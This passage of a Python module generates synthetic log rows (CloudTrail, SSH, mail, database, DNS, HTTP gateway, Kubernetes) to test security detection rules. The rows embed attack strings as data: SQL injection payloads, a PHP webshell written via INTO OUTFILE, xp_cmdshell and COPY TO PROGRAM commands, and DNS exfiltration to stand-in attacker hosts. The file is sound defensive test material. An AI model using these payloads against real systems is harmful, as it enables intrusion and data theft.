                  "PassRole", "CreateAccessKey", "AddUserToGroup"]
    rows = [{"eventSource": "iam.amazonaws.com", "eventName": name,
             "userIdentity.type": "AssumedRole",
             "userIdentity.sessionContext.sessionIssuer.userName": "ci-deployer",
             "sourceIPAddress": "203.0.113.9",
             "note": "изменение IAM-политик не-break-glass ролью"} for name in iam_events]
    rows.append({"eventSource": "iam.amazonaws.com", "eventName": "AttachRolePolicy",
                 "userIdentity.type": "AssumedRole",
                 "userIdentity.sessionContext.sessionIssuer.userName": "iam-breakglass",
                 "sourceIPAddress": "198.51.100.4",
                 "note": "break-glass роль — отфильтровывается"})
    rows.append({"eventSource": "s3.amazonaws.com", "eventName": "GetObject",
                 "userIdentity.type": "AssumedRole",
                 "userIdentity.sessionContext.sessionIssuer.userName": "ci-deployer",
                 "sourceIPAddress": "203.0.113.9",
                 "note": "другой eventSource — не совпадение"})

    # S3-разведка и публичный доступ (f6a7b8c9-0007..0009)
    rows.append({"eventSource": "s3.amazonaws.com", "eventName": "ListObjects",
                 "userIdentity.type": "Anonymous", "sourceIPAddress": "203.0.113.30",
                 "requestParameters.bucketName": "target-backet",
                 "note": "анонимное перечисление бакета (--no-sign-request)"})
    rows.append({"eventSource": "s3.amazonaws.com", "eventName": "PutBucketAcl",
                 "userIdentity.type": "AssumedRole",
                 "userIdentity.sessionContext.sessionIssuer.userName": "dev-ivanov",
                 "sourceIPAddress": "10.10.70.5",
                 "requestParameters.bucketName": "public-assets",
                 "requestParameters.acl": "public-read",
                 "note": "бакет сделан публичным (public-read)"})
    rows.append({"eventSource": "s3.amazonaws.com", "eventName": "GetObject",
                 "userIdentity.type": "Anonymous", "sourceIPAddress": "203.0.113.31",
                 "requestParameters.bucketName": "public-assets",
                 "requestParameters.key": "backup/db-dump.sql.gz",
                 "note": "анонимное скачивание объекта из публичного бакета"})
    rows.append({"eventSource": "s3.amazonaws.com", "eventName": "GetObject",
                 "userIdentity.type": "AssumedRole",
                 "userIdentity.sessionContext.sessionIssuer.userName": "intern-role",
                 "sourceIPAddress": "10.10.70.9",
                 "requestParameters.bucketName": "corp-terraform-state",
                 "requestParameters.key": "prod/terraform.tfstate",
                 "note": "чтение tfstate с секретами ролью без необходимости"})

    # OIDC-доверие GitHub Actions (f6a7b8c9-0010)
    rows.append({"eventSource": "iam.amazonaws.com", "eventName": "UpdateAssumeRolePolicy",
                 "userIdentity.type": "IAMUser",
                 "userIdentity.sessionContext.sessionIssuer.userName": "ci-terraform",
                 "sourceIPAddress": "10.10.70.11",
                 "requestParameters.roleName": "github-deploy",
                 "note": "политика доверия OIDC-роли расширена"})
    rows.append({"eventSource": "iam.amazonaws.com", "eventName": "CreateOIDCProvider",
                 "userIdentity.type": "IAMUser",
                 "userIdentity.sessionContext.sessionIssuer.userName": "ci-terraform",
                 "sourceIPAddress": "10.10.70.11",
                 "requestParameters.clientIDList": "sts.amazonaws.com",
                 "note": "создан новый OIDC-провайдер"})

    # Lambda confused deputy (f6a7b8c9-0011)
    rows.append({"eventSource": "lambda.amazonaws.com",
                 "eventName": "UpdateFunctionConfiguration",
                 "userIdentity.type": "AssumedRole",
                 "userIdentity.sessionContext.sessionIssuer.userName": "dev-ivanov",
                 "sourceIPAddress": "10.10.70.12",
                 "requestParameters.functionName": "payments-api",
                 "note": "изменены переменные окружения функции (секреты в env)"})
    rows.append({"eventSource": "sts.amazonaws.com", "eventName": "AssumeRole",
                 "userIdentity.type": "AssumedRole",
                 "userIdentity.sessionContext.sessionIssuer.userName": "reports-lambda",
                 "sourceIPAddress": "3.120.90.4",
                 "requestParameters.roleName": "lambda-payments-role",
                 "note": "функция отчётов принимает роль платежей (confused deputy)"})
    return rows


def windows_rdp() -> list[dict]:
    """События RDP-входов для правила d4e5f6a7-0003."""
    rows: list[dict] = []
    # 12 неудачных RemoteInteractive-входов с одного адреса (count > 10)
    for index in range(12):
        rows.append({"EventID": 4625, "LogonType": 10, "TargetUserName": "admin",
                     "IpAddress": "203.0.113.55", "SubStatus": "0xc000006a",
                     "WorkstationName": "RDP", "Sequence": index,
                     "note": "failed RDP logon: bruteforce"})
    # успешный RDP-вход по NTLM
    rows.append({"EventID": 4624, "LogonType": 10, "TargetUserName": "support",
                 "IpAddress": "10.10.20.55", "AuthenticationPackageName": "NTLM",
                 "LogonProcessName": "NtLmSsp", "note": "RDP по NTLM вместо Kerberos"})
    # успешный RDP-вход по Kerberos — не совпадение для комбинации с ntlm_rdp
    rows.append({"EventID": 4624, "LogonType": 10, "TargetUserName": "petrova",
                 "IpAddress": "10.10.20.15", "AuthenticationPackageName": "Kerberos",
                 "LogonProcessName": "Kerberos", "note": "обычный RDP-вход"})
    # переподключение сессии
    rows.append({"EventID": 4778, "AccountName": "ivanov", "ClientName": "WS01",
                 "ClientAddress": "10.10.20.31", "SessionName": "RDP-Tcp#2",
                 "note": "reconnect к отключённой сессии"})
    # shadowing через tscon
    rows.append({"EventID": 4688, "AccountName": "helpdesk", "LogonId": "0x3e9f1",
                 "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                 "CommandLine": "tscon 3 /dest:rdp-tcp#0",
                 "note": "подключение к чужой сессии"})
    return rows


def mail_smtp() -> list[dict]:
    """Журнал MTA (Postfix-подобный) для правила d4e5f6a7-0001."""
    rows: list[dict] = []
    rows.append({"process": "postfix/smtpd", "client_ip": "203.0.113.7",
                 "queue_id": "A1B2C3", "message":
                 "connect from unknown[203.0.113.7]: relay=smtp.gmail.com client=unknown[203.0.113.7]",
                 "note": "неаутентифицированный клиент пересылает внешнему получателю"})
    rows.append({"process": "postfix/smtpd", "client_ip": "203.0.113.7", "queue_id": "A1B2C4",
                 "message": "NOQUEUE: reject: RCPT from unknown[203.0.113.7]: 554 5.7.1 "
                            "<external@example.com>: Relay access denied",
                 "note": "relay отклонён (защита сработала)"})
    rows.append({"process": "postfix/smtpd", "client_ip": "198.51.100.9", "queue_id": "",
                 "message": "VRFY ivanov", "note": "проба VRFY из интернета"})
    rows.append({"process": "postfix/smtpd", "client_ip": "198.51.100.9", "queue_id": "",
                 "message": "EXPN postmaster", "note": "проба EXPN"})
    for index in range(12):
        rows.append({"process": "postfix/smtpd", "client_ip": "198.51.100.20",
                     "queue_id": "", "message":
                     f"warning: unknown[198.51.100.20]: SASL authentication failed; "
                     f"seq={index}", "note": "перебор паролей на submission-порте"})
    for index in range(201):
        rows.append({"process": "postfix/smtpd", "client_ip": "203.0.113.33",
                     "queue_id": f"BULK{index}", "message":
                     f"to=<user{index}@victim.example>, relay=none, status=bounced",
                     "note": "массовая рассылка внешним получателям"})
    for index in range(5):
        rows.append({"process": "postfix/smtpd", "client_ip": "10.10.20.5",
                     "queue_id": f"LOCAL{index}", "message":
                     f"to=<user{index}@corp.lab>, relay=local, status=sent",
                     "note": "обычная внутренняя почта — порог не превышен"})
    return rows


def linux_auth_ssh() -> list[dict]:
    """Журнал аутентификации SSH для правила d4e5f6a7-0002."""
    rows: list[dict] = []
    for index in range(22):
        rows.append({"process": "sshd", "source_ip": "203.0.113.77", "user": "admin",
                     "message": f"Failed password for invalid user admin from 203.0.113.77 "
                                f"port {40000 + index} ssh2",
                     "note": "перебор паролей"})
    for index in range(3):
        rows.append({"process": "sshd", "source_ip": "203.0.113.78", "user": "root",
                     "message": f"Failed password for root from 203.0.113.78 port {50000 + index} ssh2",
                     "note": "перебор root — порог не превышен"})
    rows.append({"process": "sshd", "source_ip": "203.0.113.77", "user": "root",
                 "message": "Accepted password for root from 203.0.113.77 port 41000 ssh2",
                 "note": "успешный вход root по паролю"})
    rows.append({"process": "sshd", "source_ip": "10.10.20.44", "user": "ivanov",
                 "message": "Accepted publickey for ivanov from 10.10.20.44 port 52000 ssh2: "
                            "ED25519 SHA256:abc",
                 "note": "обычный вход по ключу — не совпадение само по себе"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/ssh",
                 "CommandLine": "ssh -L 8080:localhost:8080 user@10.10.20.9",
                 "ParentImage": "/bin/bash", "User": "ivanov", "auid": 1000,
                 "note": "туннель -L"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/ssh",
                 "CommandLine": "ssh -D 1080 user@10.10.20.9",
                 "ParentImage": "/bin/bash", "User": "ivanov", "auid": 1000,
                 "note": "SOCKS-прокси -D"})
    rows.append({"EventType": "PATH", "Name": "/home/ivanov/.ssh/authorized_keys",
                 "Image": "/usr/bin/bash", "User": "ivanov", "auid": 1000, "euid": 1000,
                 "note": "добавление ключа"})
    rows.append({"EventType": "EXECVE", "Image": "/usr/bin/ssh",
                 "CommandLine": "ssh user@10.10.20.9", "ParentImage": "/bin/bash",
                 "User": "petrova", "auid": 1001, "note": "обычное подключение"})
    return rows


def database_error() -> list[dict]:
    """Журнал ошибок СУБД (приложение пишет их в лог вместе с проблемным запросом).

    Синтетические события для правил по диалектам SQL-инъекций
    (e5f6a7b8-0018..0041): MSSQL, MySQL, PostgreSQL, Oracle, SQLite.
    """
    rows: list[dict] = []
    rows.append({"ts": "2026-10-20T11:00:01Z", "engine": "mssql", "db_user": "webapp",
                 "client_ip": "10.10.20.23", "error_code": 245,
                 "error_message": "Conversion failed when converting the nvarchar value "
                                  "'sa' to data type int.",
                 "statement": "SELECT * FROM items WHERE id='' AND 1=CONVERT(int,(SELECT DB_NAME())) --'",
                 "note": "MSSQL error-based: CONVERT вернул имя пользователя БД"})
    rows.append({"ts": "2026-10-20T11:00:02Z", "engine": "mssql", "db_user": "webapp",
                 "client_ip": "10.10.20.23", "error_code": 245,
                 "error_message": "Conversion failed when converting the nvarchar value "
                                  "'Microsoft SQL Server 2019 (RTM-CU18) - 15.0.4223.1 (X64)' "
                                  "to data type int.",
                 "statement": "SELECT @@version",
                 "note": "MSSQL: баннер версии утёк в текст ошибки"})
    rows.append({"ts": "2026-10-20T11:00:03Z", "engine": "mssql", "db_user": "webapp",
                 "client_ip": "10.10.20.24", "error_code": 15281,
                 "error_message": "SQL Server blocked access to procedure 'sys.xp_cmdshell' "
                                  "of component 'xp_cmdshell' because this component is "
                                  "turned off as part of the security configuration.",
                 "statement": "EXEC xp_cmdshell 'whoami'",
                 "note": "MSSQL: попытка xp_cmdshell (заблокирована конфигурацией)"})
    rows.append({"ts": "2026-10-20T11:00:04Z", "engine": "mssql", "db_user": "webapp",
                 "client_ip": "10.10.20.22", "error_code": 8127,
                 "error_message": "Column 'items.name' is invalid in the select list because "
                                  "it is not contained in either an aggregate function or "
                                  "the GROUP BY clause.",
                 "statement": "SELECT * FROM items WHERE id='' HAVING 1=1--'",
                 "note": "MSSQL: HAVING-проба выдала ошибку группировки"})
    rows.append({"ts": "2026-10-20T11:01:01Z", "engine": "mysql", "db_user": "shop",
                 "client_ip": "10.10.20.26", "error_code": 1105,
                 "error_message": "XPATH syntax error: '~5.7.42-log'",
                 "statement": "SELECT * FROM items WHERE id=1' AND "
                              "EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) -- -'",
                 "note": "MySQL: EXTRACTVALUE вернул версию в тексте ошибки"})
    rows.append({"ts": "2026-10-20T11:01:02Z", "engine": "mysql", "db_user": "shop",
                 "client_ip": "10.10.20.26", "error_code": 29,
                 "error_message": "File '/etc/passwd' not found (Errcode: 13 - Permission denied)",
                 "statement": "SELECT LOAD_FILE('/etc/passwd'),2,3",
                 "note": "MySQL: LOAD_FILE читает системный файл"})
    rows.append({"ts": "2026-10-20T11:01:03Z", "engine": "mysql", "db_user": "shop",
                 "client_ip": "10.10.20.26", "error_code": 1,
                 "error_message": "Can't create/write to file '/var/www/html/shell.php' "
                                  "(Errcode: 13 - Permission denied)",
                 "statement": "SELECT '<?php system($_GET[0]);?>' INTO OUTFILE "
                              "'/var/www/html/shell.php'",
                 "note": "MySQL: INTO OUTFILE пишет webshell"})
    rows.append({"ts": "2026-10-20T11:01:04Z", "engine": "mysql", "db_user": "shop",
                 "client_ip": "10.10.20.37", "error_code": 1064,
                 "error_message": "You have an error in your SQL syntax; check the manual "
                                  "that corresponds to your MySQL server version for the "
                                  "right syntax to use near 'UPDATE users SET role='admin' "
                                  "WHERE id=2' at line 1",
                 "statement": "SELECT * FROM items WHERE id=1'; UPDATE users SET "
                              "role='admin' WHERE id=2; -- -'",
                 "note": "MySQL: stacked queries — второй запрос виден в ошибке"})
    rows.append({"ts": "2026-10-20T11:01:05Z", "engine": "mysql", "db_user": "shop",
                 "client_ip": "10.10.20.27", "error_code": 1222,
                 "error_message": "The used SELECT statements have a different number of columns",
                 "statement": "SELECT id,name FROM items UNION SELECT table_schema,"
                              "table_name,column_name,4 FROM information_schema.columns",
                 "note": "MySQL: UNION-перечисление схемы не сошлось по колонкам"})
    rows.append({"ts": "2026-10-20T11:01:06Z", "engine": "mysql", "db_user": "shop",
                 "client_ip": "10.10.20.29", "error_code": 1054,
                 "error_message": "Unknown column '10' in 'order clause'",
                 "statement": "SELECT * FROM items WHERE id=1' ORDER BY 10 -- -'",
                 "note": "MySQL: подбор числа колонок через ORDER BY"})
    rows.append({"ts": "2026-10-20T11:01:07Z", "engine": "mysql", "db_user": "reports",
                 "client_ip": "10.10.30.5", "error_code": 1064,
                 "error_message": "You have an error in your SQL syntax; check the manual "
                                  "that corresponds to your MySQL server version for the "
                                  "right syntax to use near 'UNION SELECT password_hash, "
                                  "api_key FROM users--'' at line 1",
                 "statement": "SELECT * FROM reports WHERE org_name='ACME' UNION SELECT "
                              "password_hash, api_key FROM users--'",
                 "note": "second-order: сохранённое значение подставилось в запрос отчёта"})
    rows.append({"ts": "2026-10-20T11:02:01Z", "engine": "postgresql", "db_user": "app",
                 "client_ip": "10.10.20.35", "error_code": "22P02",
                 "error_message": "invalid input syntax for type integer: "
                                  "\"PostgreSQL 15.4 on x86_64-pc-linux-gnu, compiled by "
                                  "gcc 12.2.0, 64-bit\"",
                 "statement": "SELECT * FROM items WHERE id='' AND 1=CAST((SELECT version()) "
                              "AS INT) --'",
                 "note": "PostgreSQL: CAST вернул версию в тексте ошибки"})
    rows.append({"ts": "2026-10-20T11:02:02Z", "engine": "postgresql", "db_user": "app",
                 "client_ip": "10.10.20.34", "error_code": "42501",
                 "error_message": "ERROR: permission denied to copy to a file using the "
                                  "server program",
                 "statement": "COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned'",
                 "note": "PostgreSQL: COPY TO PROGRAM (заблокировано правами)"})
    rows.append({"ts": "2026-10-20T11:02:03Z", "engine": "postgresql", "db_user": "app",
                 "client_ip": "10.10.20.32", "error_code": "42601",
                 "error_message": "ERROR: syntax error at or near \"IS\"",
                 "statement": "SELECT * FROM items WHERE id='' AND (SELECT pg_sleep(5)) "
                              "IS NOT NULL --'",
                 "note": "PostgreSQL: pg_sleep-проба в ошибке синтаксиса"})
    rows.append({"ts": "2026-10-20T11:03:01Z", "engine": "oracle", "db_user": "APPUSER",
                 "client_ip": "10.10.20.32", "error_code": "ORA-06502",
                 "error_message": "ORA-06502: PL/SQL: numeric or value error: character "
                                  "string buffer too small — Oracle Database 19c Enterprise "
                                  "Edition Release 19.0.0.0.0",
                 "statement": "SELECT * FROM items WHERE id='' AND "
                              "1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version "
                              "WHERE ROWNUM=1))--'",
                 "note": "Oracle: DRITHSX.SN вывела баннер версии через ошибку"})
    rows.append({"ts": "2026-10-20T11:04:01Z", "engine": "sqlite", "db_user": "app",
                 "client_ip": "10.10.20.36", "error_code": "SQLITE_ERROR",
                 "error_message": "sqlite3.OperationalError: unrecognized token: "
                                  "\"' UNION SELECT name\"",
                 "statement": "SELECT * FROM items WHERE id='' UNION SELECT name, sql, 3 "
                              "FROM sqlite_master --'",
                 "note": "SQLite: перечисление схемы через sqlite_master"})
    rows.append({"ts": "2026-10-20T11:05:01Z", "engine": "mysql", "db_user": "shop",
                 "client_ip": "10.10.20.50", "error_code": 1146,
                 "error_message": "Table 'app.sessions' doesn't exist",
                 "statement": "SELECT * FROM sessions WHERE id=42",
                 "note": "обычная ошибка приложения — не совпадение"})
    return rows


def dns_log() -> list[dict]:
    """Журнал DNS-сервера/резолвера для детекта OOB-каналов и rebinding."""
    rows: list[dict] = []
    rows.append({"ts": "2026-10-20T12:00:01Z", "src_ip": "10.10.30.8",
                 "qname": "a8f5f167f44f4964e6c998dee827110c.dnslog.attacker.tld",
                 "qtype": "TXT", "response_code": "NOERROR", "answers": [],
                 "note": "sqlmap --dns-domain: hex-поддомен (OOB-эксфильтрация)"})
    rows.append({"ts": "2026-10-20T12:00:02Z", "src_ip": "10.10.30.8",
                 "qname": "x7data.oastify.com", "qtype": "A", "response_code": "NOERROR",
                 "answers": ["93.184.216.34"], "note": "callback на платформу Burp OAST"})
    rows.append({"ts": "2026-10-20T12:00:03Z", "src_ip": "10.10.30.8",
                 "qname": "data.attacker.tld", "qtype": "A", "response_code": "NOERROR",
                 "answers": ["93.184.216.34"], "note": "UNC-callback от xp_dirtree"})
    rows.append({"ts": "2026-10-20T12:00:04Z", "src_ip": "10.10.30.8",
                 "qname": "rebind.attacker.tld", "qtype": "A", "response_code": "NOERROR",
                 "answers": ["169.254.169.254"],
                 "note": "DNS rebinding: внешнее имя зарезолвилось в адрес метаданных"})
    rows.append({"ts": "2026-10-20T12:00:07Z", "src_ip": "10.10.30.8",
                 "qname": "7f000001.c0a80001.rb.example.tld", "qtype": "A",
                 "response_code": "NOERROR", "answers": ["127.0.0.1"],
                 "note": "rebinding-сервис: hex-IP зарезолвился в loopback"})
    rows.append({"ts": "2026-10-20T12:00:05Z", "src_ip": "10.10.30.9",
                 "qname": "app.corp.lab", "qtype": "A", "response_code": "NOERROR",
                 "answers": ["10.10.30.20"], "note": "обычный внутренний запрос — не совпадение"})
    rows.append({"ts": "2026-10-20T12:00:06Z", "src_ip": "10.10.30.9",
                 "qname": "cdn.example.com", "qtype": "AAAA", "response_code": "NOERROR",
                 "answers": ["2606:2800:220:1:248:1893:25c8:1946"],
                 "note": "обычный внешний запрос — не совпадение"})
    return rows


def gateway_log() -> list[dict]:
    """Журнал HTTP-шлюза/прокси с деталями заголовков (smuggling, cache, CORS, XFF).

    Поля: scheme, method, path, host, status, content_length_count,
    content_lengths, transfer_encoding, duplicate_params, same_ts_requests,
    cache_status, session_user, x_forwarded_host, x_forwarded_scheme,
    x_forwarded_for, origin, acao (Access-Control-Allow-Origin), acac
    (Access-Control-Allow-Credentials).
    """
    rows: list[dict] = []
    # HTTP/2 CL+TE desync (e5f6a7b8-0084)
    rows.append({"ts": "2026-10-20T13:00:01Z", "source_ip": "10.10.20.70", "scheme": "h2",
                 "method": "POST", "path": "/", "host": "target.corp.lab",
                 "content_length_count": 1, "content_lengths": ["0"],
                 "transfer_encoding": "chunked", "status": 400,
                 "note": "H2: CL и TE одновременно — desync-проба"})
    rows.append({"ts": "2026-10-20T13:00:02Z", "source_ip": "10.10.20.70", "scheme": "h2",
                 "method": "POST", "path": "/", "host": "target.corp.lab",
                 "content_length_count": 2, "content_lengths": ["0", "58"],
                 "transfer_encoding": "", "status": 400,
                 "note": "H2: два разных Content-Length в одном запросе"})
    # CL.TE / TE.CL smuggling (e5f6a7b8-0092, 0093)
    rows.append({"ts": "2026-10-20T13:01:01Z", "source_ip": "10.10.20.71", "scheme": "http/1.1",
                 "method": "POST", "path": "/", "host": "target.corp.lab",
                 "content_length_count": 1, "content_lengths": ["6"],
                 "transfer_encoding": "chunked", "status": 200,
                 "note": "CL.TE: фронтенд читает CL, бэкенд — chunked"})
    rows.append({"ts": "2026-10-20T13:01:02Z", "source_ip": "10.10.20.71", "scheme": "http/1.1",
                 "method": "POST", "path": "/", "host": "target.corp.lab",
                 "content_length_count": 1, "content_lengths": ["4"],
                 "transfer_encoding": "chunked\r\nX: ignore", "status": 501,
                 "note": "TE.CL: фронтенд читает chunked, бэкенд — CL"})
    # TE-обфускация (e5f6a7b8-0094)
    rows.append({"ts": "2026-10-20T13:01:03Z", "source_ip": "10.10.20.71", "scheme": "http/1.1",
                 "method": "POST", "path": "/", "host": "target.corp.lab",
                 "content_length_count": 0, "content_lengths": [],
                 "transfer_encoding": "chunked\t", "status": 400,
                 "note": "TE.TE: таб после chunked — разные серверы читают по-разному"})
    rows.append({"ts": "2026-10-20T13:01:04Z", "source_ip": "10.10.20.71", "scheme": "http/1.1",
                 "method": "POST", "path": "/", "host": "target.corp.lab",
                 "content_length_count": 0, "content_lengths": [],
                 "transfer_encoding": "chunked, identity", "status": 400,
                 "note": "TE.TE: конфликт значений Transfer-Encoding"})
    # Web cache deception (e5f6a7b8-0095)
    rows.append({"ts": "2026-10-20T13:02:01Z", "source_ip": "10.10.20.72", "scheme": "http/1.1",
                 "method": "GET", "path": "/account/settings/nonexistent.css",
                 "host": "target.corp.lab", "status": 200, "cache_status": "HIT",
                 "session_user": "ivanov",
                 "note": "cache deception: динамическая страница закэширована как .css"})
    rows.append({"ts": "2026-10-20T13:02:02Z", "source_ip": "10.10.20.72", "scheme": "http/1.1",
                 "method": "GET", "path": "/account/settings/style.css",
                 "host": "target.corp.lab", "status": 200, "cache_status": "MISS",
                 "session_user": "",
                 "note": "обычный MISS статики — не совпадение"})
    # Web cache poisoning (e5f6a7b8-0096, 0099)
    rows.append({"ts": "2026-10-20T13:03:01Z", "source_ip": "10.10.20.73", "scheme": "http/1.1",
                 "method": "GET", "path": "/", "host": "target.corp.lab",
                 "x_forwarded_host": "attacker.tld", "status": 200, "cache_status": "HIT",
                 "note": "отравление кэша через unkeyed X-Forwarded-Host"})
    rows.append({"ts": "2026-10-20T13:03:02Z", "source_ip": "10.10.20.73", "scheme": "http/1.1",
                 "method": "GET", "path": "/", "host": "target.corp.lab",
                 "x_forwarded_scheme": "http", "status": 200, "cache_status": "HIT",
                 "note": "unkeyed X-Forwarded-Scheme: даунгрейд https в кэше"})
    # XFF-спуфинг (e5f6a7b8-0101)
    rows.append({"ts": "2026-10-20T13:04:01Z", "source_ip": "203.0.113.9", "scheme": "http/1.1",
                 "method": "GET", "path": "/admin", "host": "target.corp.lab",
                 "x_forwarded_for": "127.0.0.1", "status": 200,
                 "note": "XFF-спуфинг: внешний клиент представился localhost"})
    rows.append({"ts": "2026-10-20T13:04:02Z", "source_ip": "203.0.113.9", "scheme": "http/1.1",
                 "method": "GET", "path": "/admin", "host": "target.corp.lab",
                 "x_forwarded_for": "10.10.20.5, 127.0.0.1", "status": 200,
                 "note": "XFF-цепочка с подставленным внутренним адресом"})
    # CORS (e5f6a7b8-0097)
    rows.append({"ts": "2026-10-20T13:05:01Z", "source_ip": "203.0.113.10", "scheme": "http/1.1",
                 "method": "GET", "path": "/api/data", "host": "target.corp.lab",
                 "origin": "https://attacker.tld", "acao": "https://attacker.tld",
                 "acac": "true", "status": 200,
                 "note": "CORS: сторонний Origin отражён с credentials"})
    rows.append({"ts": "2026-10-20T13:05:02Z", "source_ip": "203.0.113.10", "scheme": "http/1.1",
                 "method": "GET", "path": "/api/data", "host": "target.corp.lab",
                 "origin": "null", "acao": "null", "acac": "true", "status": 200,
                 "note": "CORS: Origin null отражён с credentials"})
    rows.append({"ts": "2026-10-20T13:05:03Z", "source_ip": "10.10.20.80", "scheme": "http/1.1",
                 "method": "GET", "path": "/api/data", "host": "target.corp.lab",
                 "origin": "https://app.corp.lab", "acao": "https://app.corp.lab",
                 "acac": "true", "status": 200,
                 "note": "CORS: свой Origin из белого списка — не совпадение"})
    # HPP (e5f6a7b8-0086)
    rows.append({"ts": "2026-10-20T13:06:01Z", "source_ip": "10.10.20.74", "scheme": "http/1.1",
                 "method": "POST", "path": "/transfer", "host": "target.corp.lab",
                 "query": "amount=1&amount=10000&to=friend", "duplicate_params": 2,
                 "status": 200,
                 "note": "HPP: amount дважды — фронтенд и бэкенд берут разные значения"})
    # Race condition (e5f6a7b8-0091)
    rows.append({"ts": "2026-10-20T13:07:01Z", "source_ip": "10.10.20.61", "scheme": "h2",
                 "method": "POST", "path": "/apply-coupon", "host": "target.corp.lab",
                 "query": "coupon=ONCE100", "duplicate_params": 1,
                 "same_ts_requests": 30, "status": 200,
                 "note": "single-packet attack: 30 запросов в одном TCP-пакете"})
    # Дефолтные учётки и обход нормализации пути (e5f6a7b8-0103, 0107)
    rows.append({"ts": "2026-10-20T13:08:01Z", "source_ip": "203.0.113.11", "scheme": "http/1.1",
                 "method": "GET", "path": "/admin", "host": "target.corp.lab",
                 "auth_header": "Basic YWRtaW46YWRtaW4=", "status": 200,
                 "note": "вход в админку с admin:admin (Basic base64)"})
    rows.append({"ts": "2026-10-20T13:08:02Z", "source_ip": "203.0.113.12", "scheme": "http/1.1",
                 "method": "GET", "path": "/admin/..;/actuator/env", "host": "target.corp.lab",
                 "status": 200,
                 "note": "обход Spring Security через ..; к actuator"})
    return rows


def k8s_audit() -> list[dict]:
    """События Kubernetes Audit Log (плоские ключи для мини-Sigma)."""
    rows: list[dict] = []
    rows.append({"ts": "2026-10-20T14:00:01Z", "stage": "ResponseComplete", "verb": "get",
                 "user_username": "system:anonymous",
                 "user_groups": ["system:unauthenticated"],
                 "objectRef_resource": "pods", "objectRef_namespace": "default",
                 "responseStatus_code": 200,
                 "requestURI": "/api/v1/namespaces/default/pods",
                 "sourceIPs": ["203.0.113.20"],
                 "note": "анонимный доступ к API: список подов разрешён"})
    rows.append({"ts": "2026-10-20T14:00:02Z", "stage": "ResponseComplete", "verb": "list",
                 "user_username": "system:anonymous",
                 "user_groups": ["system:unauthenticated"],
                 "objectRef_resource": "namespaces", "responseStatus_code": 200,
                 "requestURI": "/api/v1/namespaces", "sourceIPs": ["203.0.113.20"],
                 "note": "анонимное перечисление namespaces"})
    rows.append({"ts": "2026-10-20T14:00:03Z", "stage": "ResponseComplete", "verb": "get",
                 "user_username": "system:anonymous",
                 "user_groups": ["system:unauthenticated"],
                 "responseStatus_code": 200, "requestURI": "/version",
                 "sourceIPs": ["203.0.113.20"], "note": "анонимный /version"})
    rows.append({"ts": "2026-10-20T14:00:04Z", "stage": "ResponseComplete", "verb": "create",
                 "user_username": "system:anonymous",
                 "user_groups": ["system:unauthenticated"],
                 "objectRef_resource": "selfsubjectrulesreviews",
                 "responseStatus_code": 403,
                 "requestURI": "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
                 "sourceIPs": ["203.0.113.20"],
                 "note": "анонимная разведка RBAC (отклонено, но зафиксировано)"})
    rows.append({"ts": "2026-10-20T14:01:01Z", "stage": "ResponseComplete", "verb": "list",
                 "user_username": "system:serviceaccount:default:task-runner",
                 "user_groups": ["system:serviceaccounts"],
                 "objectRef_resource": "secrets", "objectRef_namespace": "default",
                 "responseStatus_code": 200,
                 "requestURI": "/api/v1/namespaces/default/secrets",
                 "sourceIPs": ["10.10.40.5"],
                 "note": "SA пода перечисляет все секреты неймспейса"})
    rows.append({"ts": "2026-10-20T14:01:02Z", "stage": "ResponseComplete", "verb": "get",
                 "user_username": "system:serviceaccount:default:build",
                 "user_groups": ["system:serviceaccounts"],
                 "objectRef_resource": "secrets", "objectRef_namespace": "default",
                 "objectRef_name": "db-credentials", "responseStatus_code": 200,
                 "requestURI": "/api/v1/namespaces/default/secrets/db-credentials",
                 "sourceIPs": ["10.10.40.6"],
                 "note": "build-SA читает секрет БД — избыточные права"})
    rows.append({"ts": "2026-10-20T14:01:03Z", "stage": "ResponseComplete", "verb": "create",
                 "user_username": "system:serviceaccount:ci:deployer",
                 "user_groups": ["system:serviceaccounts"],
                 "objectRef_resource": "pods", "objectRef_namespace": "default",
                 "responseStatus_code": 201,
                 "requestURI": "/api/v1/namespaces/default/pods",
                 "sourceIPs": ["10.10.40.7"],
                 "requestObject": '{"spec":{"containers":[{"name":"x",'
                                  '"securityContext":{"privileged":true},'
                                  '"volumeMounts":[{"mountPath":"/host","name":"host"}]}],'
                                  '"volumes":[{"hostPath":{"path":"/"},"name":"host"}]}}',
                 "note": "privileged-под с hostPath / — захват узла"})
    rows.append({"ts": "2026-10-20T14:01:04Z", "stage": "ResponseComplete", "verb": "create",
                 "user_username": "dev-user", "user_groups": ["devs"],
                 "objectRef_resource": "clusterrolebindings",
                 "objectRef_name": "deployer-admin", "responseStatus_code": 201,
                 "requestURI": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings",
                 "sourceIPs": ["10.10.40.8"],
                 "requestObject": '{"subjects":[{"kind":"ServiceAccount","name":"default",'
                                  '"namespace":"kube-system"}],'
                                  '"roleRef":{"kind":"ClusterRole","name":"cluster-admin"}}',
                 "note": "cluster-admin привязан к default SA"})
    rows.append({"ts": "2026-10-20T14:01:05Z", "stage": "ResponseComplete", "verb": "get",
                 "user_username": "system:serviceaccount:monitoring:prometheus",
                 "user_groups": ["system:serviceaccounts"],
                 "objectRef_resource": "nodes", "responseStatus_code": 200,
                 "requestURI": "/api/v1/nodes", "sourceIPs": ["10.10.40.9"],
                 "note": "штатный мониторинг — не совпадение"})
    rows.append({"ts": "2026-10-20T14:01:06Z", "stage": "ResponseComplete", "verb": "create",
                 "user_username": "system:serviceaccount:default:task-runner",
                 "user_groups": ["system:serviceaccounts"],
                 "objectRef_resource": "pods", "objectRef_subresource": "exec",
                 "objectRef_name": "worker-1", "objectRef_namespace": "default",
                 "responseStatus_code": 101,
                 "requestURI": "/api/v1/namespaces/default/pods/worker-1/exec",
                 "sourceIPs": ["10.10.40.5"],
                 "note": "SA пода получает exec в соседний под"})
    rows.append({"ts": "2026-10-20T14:02:01Z", "stage": "ResponseComplete", "verb": "get",
                 "user_username": "root", "objectRef_resource": "secrets",
                 "responseStatus_code": 200,
                 "requestURI": "/v2/keys/registry/secrets/default/db-credentials",
                 "sourceIPs": ["10.10.40.10"],
                 "note": "прямое чтение секретов из etcd (без EncryptionConfiguration)"})
    return rows


def gcp_audit() -> list[dict]:
